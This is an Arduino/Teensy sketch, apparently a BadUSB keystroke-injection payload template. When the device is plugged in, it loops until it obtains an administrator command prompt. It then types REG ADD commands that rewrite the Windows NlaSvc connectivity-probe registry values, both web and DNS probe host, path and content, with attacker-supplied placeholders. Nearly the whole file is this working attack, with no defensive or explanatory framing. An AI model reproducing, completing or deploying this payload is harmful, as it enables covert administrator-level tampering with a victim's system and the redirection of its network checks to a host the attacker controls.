#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

#define REG_Host "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NlaSvc\\Parameters\\Internet /v ActiveWebProbeHost /d INPUT0 /f"
#define REG_Path "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NlaSvc\\Parameters\\Internet /v ActiveWebProbePath /d INPUT1 /f"
#define REG_Content "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NlaSvc\\Parameters\\Internet /v ActiveWebProbeContent /d INPUT2 /f"
#define REG_DNSHost "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NlaSvc\\Parameters\\Internet /v ActiveDNSProbeHost /d \"INPUT3\" /f"
#define REG_DNSContent "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NlaSvc\\Parameters\\Internet /v ActiveDNSProbeContent /d \"INPUT4\" /f"
#define TYPESPEED 20

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(REG_Host);
  delay(1000);
  Keyboard.println(REG_Path);
  delay(1000);
  Keyboard.println(REG_Content);
  delay(1000);
  Keyboard.println(REG_DNSHost);
  delay(1000);
  Keyboard.println(REG_DNSContent);
  delay(2000);
  Keyboard.println("exit");

}

void loop() {

}

DEFS